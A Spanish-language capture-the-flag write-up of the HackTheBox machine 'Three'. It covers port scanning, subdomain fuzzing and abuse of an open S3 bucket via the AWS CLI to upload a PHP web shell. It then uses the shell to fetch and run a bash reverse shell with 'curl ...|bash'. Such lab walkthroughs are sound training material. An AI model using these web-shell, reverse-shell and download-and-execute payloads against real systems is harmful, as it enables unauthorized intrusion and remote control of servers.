---
publish: true
created: 2026-09-11T12:16:55.947Z
modified: 2026-09-11T18:12:58.321Z
---

# Three

Plataforma: HackTheBox
OS: Linux
Level: Easy
Status: Done
Complete: Yes
Created time: 5 de diciembre de 2024 17:37
IP: 10.129.203.61

## Recopilación de información

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

<aside>
💡 NMAP

</aside>

```bash
❯ sudo nmap -p- --open -T5 -sS --min-rate 5000 -vvv -n -Pn 10.129.242.54 -oG targeted
```

![image.png](WriteUps/images/HackTheBox/image.png)

```bash
sudo namp -p22,80 -SCV 10.129.242.54 -oN tallports
```

![image.png](WriteUps/images/HackTheBox/image 1.png)

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

- **Identificación de vulnerabilidades**
  - 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  - 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)

- **Web Discovery**

![image.png](WriteUps/images/HackTheBox/image 2.png)

```bash
echo "10.129.203.61 thetoppers.htb" | sudo tee -a /etc/hosts
```

Fuzzing subdomains:

```bash
gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain | grep -v "Status: 400"

# --append-domain
#grep -v "status 400" : Oculta codigo error 400
```

```bash
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host:FUZZ.thetoppers.htb" -u 10.129.203.61 --hl=234   
```

![image.png](WriteUps/images/HackTheBox/image 3.png)

Añadimos el subdominio al etc/host

```bash
echo "10.129.203.61 thetoppers.htb,s3.thetoppers.htb" | sudo tee -a /etc/hosts
```

Visitamos el subdominio: s3.thetoppers.htb

![image.png](WriteUps/images/HackTheBox/image 4.png)

Hacemos fuzzing:

```bash
gobuster dir -u http://s3.thetoppers.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

![image.png](WriteUps/images/HackTheBox/image 5.png)

## Explotación

### Explotación 1

Seguimos configuracion de AWS:

```bash
aws configure
```

![image.png](WriteUps/images/HackTheBox/image 6.png)

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls 
```

![image.png](WriteUps/images/HackTheBox/image 7.png)

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

![image.png](WriteUps/images/HackTheBox/image 8.png)

Probamos a subir un fichero a la raiz del servidor :

```bash
<?php system($_GET["cmd"]); ?>
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Lo subimos mediante:

```bash
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

Accedemos a :

```html
http://thetoppers.htb/shell.php?cmd=id
```

![image.png](WriteUps/images/HackTheBox/image 9.png)

Creamos un fichero que al llamarlo por curl, nos de acceso a una rever shell: rever.sh

```html
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.76/4444 0>&1
```

Nos ponemos en escucha

```html
nc -lvnp 4444
```

Montamos un servidor web para poder llamar al fichermo mediante curl:

```html
python3 -m http.server 8080
```

Hacemos curl al fichero:

```html
http://thetoppers.htb/shell.php?cmd=curl%2010.10.16.76:8080/rever.sh|bash

```

Obtenemos acceso a la maquina:

![image.png](WriteUps/images/HackTheBox/image 10.png)

## Explotación posterior

<aside>
💡 Buscamos la Flag

</aside>

```bash
find / -name  "flag.txt"
```

![image.png](WriteUps/images/HackTheBox/image 11.png)

## Conclusión

<aside>
💡 No he podido resolver la maquina sin writteup por el tema de AWS.

</aside>

<aside>
💡 No hay escalada de privilegios.

</aside>
